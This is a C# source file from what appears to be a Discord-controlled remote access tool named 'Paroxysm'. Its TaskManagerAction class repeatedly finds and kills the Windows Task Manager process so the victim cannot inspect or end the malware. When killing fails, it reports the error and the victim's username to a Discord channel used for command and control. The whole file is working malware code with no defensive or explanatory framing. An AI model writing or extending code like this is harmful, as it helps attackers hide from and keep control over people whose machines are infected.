using System.ComponentModel;
using System.Diagnostics;
using Discord;
using Paroxysm.Discord;
using Paroxysm.Tools;

namespace Paroxysm.Hooks.Actions;

public static class TaskManagerAction
{
    private static Process? GetTaskManagerProcess()
    {
        var process = Process.GetProcessesByName("Taskmgr");
        return process.Length > 0 ? process[0] : null;
    }

    public static void Follow(object? sender, DoWorkEventArgs doWorkEventArgs)
    {
        while (Settings.TaskmgrClosed)
        {
            var taskMgr = GetTaskManagerProcess();
            if (taskMgr == null) continue;

            try
            {
                taskMgr.Kill();
                taskMgr.WaitForExit(1000);
                taskMgr.Close();
            }
            catch
            {
                var embed = EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
                    "Cannot kill task manager process.", Environment.UserName, null);
                var message = DiscordStatement.CurrentChannel.SendMessageAsync(null, false, embed).Result;
                Task.Run(() => DiscordStatement.CurrentChannel.DeleteMessageAsync(message)).Wait(10000);
            }
        }
    }
}